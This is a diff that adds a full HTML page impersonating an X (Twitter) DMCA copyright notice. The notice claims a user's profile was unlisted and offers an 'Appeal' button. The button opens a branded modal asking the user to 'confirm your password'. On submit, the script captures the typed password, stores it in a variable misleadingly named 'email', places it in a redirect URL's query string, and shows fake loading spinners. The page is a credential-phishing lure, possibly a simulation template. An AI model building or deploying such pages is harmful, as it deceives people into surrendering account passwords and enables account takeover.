@@ -1,0 +1,604 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>(2) Copyright Notice / X</title>
+    <style>
+      :root {
+        --bg-color: #000000;
+        --text-main: #e7e9ea;
+        --text-secondary: #71767b;
+        --border-color: #2f3336;
+        --accent-color: #1d9bf0;
+        --button-primary-bg: #eff3f4;
+        --button-primary-text: #0f1419;
+        --button-hover: #d7dbdc;
+        --modal-bg: #000000;
+        --input-border: #333639;
+        --font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: var(--font-family);
+      }
+
+      body {
+        background-color: var(--bg-color);
+        color: var(--text-main);
+        font-family: var(--font-family);
+        font-size: 15px;
+        line-height: 1.5;
+        display: flex;
+        justify-content: center;
+        min-height: 100vh;
+      }
+
+      /* Layout */
+      .container {
+        width: 100%;
+        max-width: 600px;
+        border-left: 1px solid var(--border-color);
+        border-right: 1px solid var(--border-color);
+        min-height: 100vh;
+        position: relative;
+      }
+
+      /* Header */
+      header {
+        position: sticky;
+        top: 0;
+        background-color: rgba(0, 0, 0, 0.65);
+        backdrop-filter: blur(12px);
+        border-bottom: 1px solid var(--border-color);
+        height: 53px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 0 16px;
+        z-index: 10;
+      }
+
+      .header-logo {
+        width: 24px;
+        height: 24px;
+        fill: var(--text-main);
+      }
+
+      .user-corner {
+        position: absolute;
+        right: 16px;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background-color: #333;
+        background-image: url("https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png"); /* Placeholder */
+        background-size: cover;
+        cursor: pointer;
+      }
+
+      /* Main Content */
+      .content-area {
+        padding: 32px;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+      }
+
+      h1 {
+        font-size: 23px;
+        font-weight: 700;
+        margin-bottom: 8px;
+      }
+
+      p {
+        color: var(--text-secondary);
+        font-size: 15px;
+        margin-bottom: 10px;
+      }
+
+      .info-box {
+        background-color: transparent;
+        border-radius: 16px;
+        margin-bottom: 10px;
+      }
+
+      /* The "Tweet" Preview */
+      .tweet-preview {
+        border: 1px solid var(--border-color);
+        border-radius: 16px;
+        padding: 12px 16px;
+        margin: 20px 0;
+        background-color: #000;
+      }
+
+      .tweet-header {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 4px;
+      }
+
+      .avatar-small {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background-image: url("https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png");
+        background-size: cover;
+      }
+
+      .user-meta {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        line-height: 1.2;
+      }
+
+      .name {
+        font-weight: 700;
+        color: var(--text-main);
+      }
+
+      .handle {
+        color: var(--text-secondary);
+      }
+
+      .withheld-content {
+        background-color: #16181c;
+        color: var(--text-secondary);
+        padding: 40px 20px;
+        border-radius: 12px;
+        margin-top: 10px;
+        text-align: center;
+        font-size: 14px;
+        border: 1px solid var(--border-color);
+      }
+
+      /* Actions */
+      .action-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        margin-top: 10px;
+      }
+
+      .btn {
+        width: 100%;
+        padding: 12px;
+        border-radius: 9999px;
+        font-weight: 700;
+        font-size: 15px;
+        cursor: pointer;
+        text-align: center;
+        transition: background-color 0.2s;
+        border: none;
+        text-decoration: none;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .btn-primary {
+        background-color: var(--button-primary-bg);
+        color: var(--button-primary-text);
+      }
+
+      .btn-primary:hover {
+        background-color: var(--button-hover);
+      }
+
+      .btn-secondary {
+        background-color: transparent;
+        color: var(--text-main);
+        border: 1px solid var(--border-color);
+      }
+
+      .btn-secondary:hover {
+        background-color: rgba(239, 243, 244, 0.1);
+      }
+
+      /* Modal Overlay */
+      .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(91, 112, 131, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.05s;
+      }
+
+      .modal-overlay.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .modal {
+        background-color: var(--modal-bg);
+        width: 100%;
+        max-width: 600px;
+        height: auto;
+        max-height: 90vh;
+        border-radius: 16px;
+        padding: 32px; /* Standard X Modal padding */
+        position: relative;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* Modal Header with Logo */
+      .modal-header {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 24px;
+        position: relative;
+      }
+
+      .modal-close {
+        position: absolute;
+        left: -12px; /* Adjusting for padding */
+        top: -12px;
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        font-size: 20px;
+        color: var(--text-main);
+      }
+
+      .modal-close:hover {
+        background-color: rgba(239, 243, 244, 0.1);
+      }
+
+      .modal-title {
+        font-size: 31px;
+        font-weight: 700;
+        margin-bottom: 32px;
+        color: var(--text-main);
+      }
+
+      /* Form Inputs */
+      .input-group {
+        position: relative;
+        margin-bottom: 24px;
+        border: 1px solid var(--input-border);
+        border-radius: 4px;
+        padding: 8px;
+        background-color: black;
+      }
+
+      .input-group:focus-within {
+        border-color: var(--accent-color);
+        box-shadow: 0 0 0 1px var(--accent-color);
+      }
+
+      .input-group:focus-within .input-label {
+        color: var(--accent-color);
+      }
+
+      .input-label {
+        display: block;
+        color: var(--text-secondary);
+        font-size: 13px;
+        margin-bottom: 4px;
+      }
+
+      .input-field {
+        width: 100%;
+        background: transparent;
+        border: none;
+        color: var(--text-main);
+        font-size: 17px;
+        outline: none;
+      }
+
+      .input-disabled {
+        color: var(--text-secondary);
+        cursor: not-allowed;
+      }
+
+      /* Modal Actions */
+      .modal-actions {
+        margin-top: auto;
+        padding-top: 24px;
+      }
+
+      .btn-modal-submit {
+        background-color: var(--button-primary-bg);
+        color: var(--button-primary-text);
+        width: 100%;
+        height: 50px;
+        font-size: 17px;
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          border: none;
+        }
+        .modal {
+          height: 100%;
+          max-height: 100%;
+          border-radius: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      class="spin"
+      style="
+        background-color: black;
+        position: fixed;
+        top: 0px;
+        left: 0px;
+        right: 0px;
+        bottom: 0px;
+        z-index: 999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      "
+    >
+      <svg
+        height="100%"
+        viewBox="0 0 32 32"
+        width="28px"
+        style="animation: spin 0.8s linear infinite; opacity: 0"
+      >
+        <circle
+          cx="16"
+          cy="16"
+          fill="none"
+          r="14"
+          stroke-width="4"
+          style="stroke: rgb(29, 155, 240); opacity: 0.2"
+        ></circle>
+        <circle
+          cx="16"
+          cy="16"
+          fill="none"
+          r="14"
+          stroke-width="4"
+          style="
+            stroke: rgb(29, 155, 240);
+            stroke-dasharray: 80;
+            stroke-dashoffset: 60;
+          "
+        ></circle>
+      </svg>
+    </div>
+
+    <style>
+      @keyframes spin {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <script>
+      setTimeout(() => {
+        document.querySelector(".spin svg").style.opacity = "1";
+      }, 100);
+
+      setTimeout(() => {
+        document.querySelector(".spin svg").style.animation = "";
+        document.querySelector(".spin svg").style.opacity = "0";
+      }, 400);
+      setTimeout(() => {
+        document.querySelector(".spin svg").style.animation =
+          "spin .8s linear infinite";
+        document.querySelector(".spin svg").style.opacity = "1";
+      }, 500);
+
+      setTimeout(() => {
+        document.querySelector(".spin").style.display = "none";
+      }, 800);
+    </script>
+    <div class="container">
+      <header>
+        <!-- X Logo -->
+        <svg viewBox="0 0 24 24" class="header-logo">
+          <g>
+            <path
+              d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+            ></path>
+          </g>
+        </svg>
+        <div class="user-corner" aria-label="Profile"></div>
+      </header>
+
+      <div class="content-area">
+        <h1>We've unlisted your profile due to copyright</h1>
+
+        <div class="info-box">
+          <p>
+            We received a report from a copyright holder alleging that your
+            profile infringes on their intellectual property. We have removed
+            this content from public view in compliance with the Digital
+            Millennium Copyright Act (DMCA).
+          </p>
+          <p>
+            This does not count as a strike against your account at this time.
+            However, the content will remain offline unless you submit a
+            successful counter-notice.
+          </p>
+        </div>
+
+        <!-- Visualization of the withheld content -->
+        <div class="tweet-preview">
+          <div class="tweet-header">
+            <div class="avatar-small"></div>
+            <div class="user-meta">
+              <span class="name">{{name}}</span>
+              <span class="handle">@{{handle}}</span>
+            </div>
+          </div>
+          <!-- The Placeholder for offline media -->
+          <div class="withheld-content">
+            This media has been disabled in response to a report from the
+            copyright holder.
+          </div>
+        </div>
+
+        <p style="font-size: 13px; color: var(--text-secondary)">
+          If you believe this content was removed in error (for example, due to
+          fair use), you may appeal below.
+        </p>
+
+        <div class="action-buttons">
+          <button class="btn btn-primary" id="openAppealBtn">Appeal</button>
+          <a
+            href="https://help.x.com/en/rules-and-policies/copyright-policy"
+            target="_blank"
+            class="btn btn-secondary"
+            >Learn more</a
+          >
+        </div>
+      </div>
+    </div>
+
+    <!-- Appeal Modal -->
+    <div class="modal-overlay" id="appealModal">
+      <div class="modal">
+        <div class="modal-header">
+          <div class="modal-close" id="closeAppealBtn">
+            <svg
+              viewBox="0 0 24 24"
+              width="18"
+              height="18"
+              aria-hidden="true"
+              fill="currentColor"
+            >
+              <g>
+                <path
+                  d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"
+                ></path>
+              </g>
+            </svg>
+          </div>
+          <svg viewBox="0 0 24 24" class="header-logo">
+            <g>
+              <path
+                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+              ></path>
+            </g>
+          </svg>
+        </div>
+
+        <h2 class="modal-title">Confirm your password</h2>
+
+        <form id="appealForm">
+          <!-- Prefilled Username (Disabled) -->
+          <div class="input-group">
+            <label class="input-label">Username</label>
+            <input
+              type="text"
+              class="input-field input-disabled"
+              value="@x_employee"
+              disabled
+            />
+          </div>
+
+          <!-- Email Input -->
+          <div class="input-group">
+            <label class="input-label">Password</label>
+            <input
+              type="password"
+              id="passwordInput"
+              class="input-field"
+              placeholder=""
+              required
+              autofocus
+            />
+          </div>
+
+          <div class="modal-actions">
+            <button type="submit" class="btn btn-primary btn-modal-submit">
+              Next
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const openBtn = document.getElementById("openAppealBtn");
+        const closeBtn = document.getElementById("closeAppealBtn");
+        const modal = document.getElementById("appealModal");
+        const form = document.getElementById("appealForm");
+        const emailInput = document.getElementById("passwordInput");
+
+        // Open Modal
+        openBtn.addEventListener("click", () => {
+          document.querySelector(".spin").style.display = "flex";
+
+          setTimeout(() => {
+            modal.classList.add("active");
+            emailInput.focus();
+          }, 400);
+
+          setTimeout(() => {
+            document.querySelector(".spin").style.display = "none";
+          }, 401);
+        });
+
+        // Close Modal
+        closeBtn.addEventListener("click", () => {
+          modal.classList.remove("active");
+        });
+
+        // Close on click outside
+        modal.addEventListener("click", (e) => {
+          if (e.target === modal) {
+            modal.classList.remove("active");
+          }
+        });
+
+        // Form Submission
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+          const email = emailInput.value;
+
+          // Construct the X Help Center URL
+          const baseUrl = "https://help.x.com/en/forms/ipi/dmca-retraction";
+          const redirectUrl = `${baseUrl}?email=${encodeURIComponent(email)}`;
+
+          modal.remove();
+          document.querySelector(".spin").style.display = "flex";
+
+          setTimeout(() => {
+            document.querySelector(".spin svg").style.animation = "";
+            document.querySelector(".spin svg").style.opacity = "0";
+          }, 500);
+          setTimeout(() => {
+            document.querySelector(".spin svg").style.animation =
+              "spin .8s linear infinite";
+            document.querySelector(".spin svg").style.opacity = "1";
+          }, 520);
+
+          setTimeout(() => {
+            document.querySelector(".spin").style.display = "none";
+          }, 800);
+
+          setTimeout(() => {
+            location.href = redirectUrl;
+          }, 800);
+        });
+      });
+    </script>
+  </body>
+</html>
